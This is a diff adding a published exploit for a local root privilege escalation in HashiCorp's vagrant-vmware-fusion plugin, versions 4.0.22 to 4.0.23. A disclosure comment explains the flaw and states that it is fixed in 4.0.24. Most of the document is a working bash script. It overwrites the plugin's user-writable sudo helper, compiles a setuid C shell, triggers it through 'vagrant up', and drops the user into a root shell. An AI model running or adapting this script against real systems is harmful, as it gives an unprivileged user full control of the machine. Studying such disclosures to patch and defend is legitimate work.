@@ -1,0 +1,138 @@
+# A couple of weeks ago I disclosed a local root privesc in Hashicorp's
+# vagrant-vmware-fusion plugin:
+#
+# https://m4.rkw.io/blog/cve20177642-local-root-privesc-in-hashicorp-vagrantvmw...
+#
+# The initial patch they released was 4.0.21 which unfortunately contained a bug
+# that prevented it from working at all on mac systems so I was unable to test it.
+# I then had to give my mac to Apple for a couple of weeks for some repairs so
+# only got around to testing 4.0.22 at the end of last week.
+#
+# Unfortunately, 4.0.22 is still exploitable and the subsequent release of 4.0.23
+# did not fix the issue.  Hashicorp reacted much faster this time, taking only a
+# few days to issue a patch instead of a few months and 4.0.24 does fix the issue.
+#
+# As discussed before the plugin installs a "sudo helper" encrypted ruby script
+# and four architecture-specific wrappers into
+# ~/.vagrant.d/gems/2.2.5/gems/vagrant-vmware-fusion-4.0.22/bin
+#
+# vagrant_vmware_desktop_sudo_helper
+# vagrant_vmware_desktop_sudo_helper_wrapper_darwin_386
+# vagrant_vmware_desktop_sudo_helper_wrapper_darwin_amd64
+# vagrant_vmware_desktop_sudo_helper_wrapper_linux_386
+# vagrant_vmware_desktop_sudo_helper_wrapper_linux_amd64
+#
+# The wrapper that matches the system architecture will be made suid root the
+# first time any vagrant box is up'd.  When a vagrant box is started the wrapper
+# script elevates privileges and then executes the ruby sudo helper script.
+#
+# Previously I exploited the unsanitised system("ruby") call to simply invoke the
+# wrapper directly and execute an arbitrary fake "ruby" script in the current PATH.
+# This is now mitigated with 4.0.22 because the wrapper refuses to execute if it's
+# not being called by vagrant.
+#
+# Unfortunately it's still possible to exploit it because the wrapper executes the
+# sudo helper as root, and the sudo helper is not root-owned so we can overwrite it
+# with any arbitrary ruby code which will then get executed as root when vagrant up
+# is run.
+#
+# The issue was reported to Hashicorp on 27/07/17 and fixed on 01/08/17.
+#
+# This exploit requires a vmware_fusion box to be present on the system in order to
+# work.  If you don't have one it may take a few minutes to download one.  Like
+# last time it targets darwin 64bit but it's likely the other architectures are
+# vulnerable too.
+#
+# https://m4.rkw.io/vagrant_vmware_privesc_4.0.23.sh.txt
+# 81c2637cd1f4064c077aabc6fa7a3451ae3f2bd99c67f25c966728f88a89d5a1
+# --------------------------------------------------------------------------
+
+#!/bin/bash
+echo
+echo "****************************************************************"
+echo "* Wooo vmware_fusion plugin 4.0.22-4.0.23 is still exploitable *"
+echo "* m4rkw                                                        *"
+echo "****************************************************************"
+echo
+echo "Shouts to #coolkids"
+echo
+
+vuln_bin=`find ~/.vagrant.d/ -name vagrant_vmware_desktop_sudo_helper_wrapper_darwin_amd64 -perm +4000 |tail -n1`
+target="/tmp/vagrant_vmware_privesc_4.0.23"
+
+if [ "$vuln_bin" == "" ] ; then
+  echo "Vulnerable binary not found."
+  exit 1
+fi
+
+if [ -e "$target" ] ; then
+  echo "Exploit payload already present."
+  $target
+  exit
+fi
+
+box=`vagrant box list |grep '(vmware_desktop' |head -n1 |cut -d ' ' -f1`
+
+if [ "$box" == "" ] ; then
+  echo "No vmware_fusion boxes found locally, we will have to download one."
+  echo
+  echo "This will take a few minutes."
+  echo
+  box="bento/ubuntu-16.04"
+fi
+
+dir=`dirname "$vuln_bin"`
+
+cd "$dir"
+
+if [ ! -e "vagrant_vmware_desktop_sudo_helper.bak" ] ; then
+  mv vagrant_vmware_desktop_sudo_helper vagrant_vmware_desktop_sudo_helper.bak
+fi
+
+cat > $target.c <<EOF
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl("/bin/bash","bash","-c","/bin/bash;rm -f $target",NULL);
+  return 0;
+}
+EOF
+gcc -o $target $target.c
+rm -f $target.c
+
+cat > vagrant_vmware_desktop_sudo_helper <<EOF
+#!/usr/bin/env ruby
+\`chown root:wheel $target\`
+\`chmod 4755 $target\`
+EOF
+
+chmod 755 vagrant_vmware_desktop_sudo_helper
+
+cat > vagrantfile <<EOF
+Vagrant.configure('2') do |config|
+  config.vm.box = '$box'
+end
+EOF
+
+vagrant up 2>/dev/null &
+
+while :
+do
+  r=`ls -la $target |grep -- '-rwsr-xr-x  1 root  wheel'`
+  if [ "$r" != "" ] ; then
+    break
+  fi
+  sleep 0.2
+done
+
+killall -9 vagrant
+
+echo
+echo "Sorry Hashicorp.. still fail :P"
+echo
+
+sleep 1
+cd
+$target
